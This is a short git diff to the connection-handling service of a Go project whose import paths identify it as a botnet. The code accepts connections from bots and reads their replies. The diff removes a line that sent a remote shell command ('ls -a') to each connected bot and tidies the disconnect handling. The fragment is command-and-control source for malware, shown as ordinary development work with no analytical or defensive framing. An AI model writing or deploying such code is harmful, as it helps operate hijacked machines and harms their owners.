@@ -3,14 +3,12 @@ package client
 import (
 	"bufio"
 	"fmt"
-	"io"
 	"log"
 	"net"
 	"strconv"
 
 	"github.com/satori/go.uuid"
 
-	"github.com/phanletrunghieu/botnet/common/cmd"
 	"github.com/phanletrunghieu/botnet/server/domain"
 )
 
@@ -68,14 +66,10 @@ func (s *Service) acceptConnection() {
 func (s *Service) handleConnection(client *domain.Client) {
 	for {
 		conn := client.Conn
-		fmt.Fprintf(conn, cmd.Execute+"ls -a\r")
 		// listen for replies
 		msg, err := bufio.NewReader(conn).ReadString('\r')
 		if err != nil {
-			if err == io.EOF {
-				delete(s.Clients, client.ID)
-			}
-			fmt.Println("xxxxxxxx", err)
+			delete(s.Clients, client.ID)
 			return
 		}
 		fmt.Print(msg)
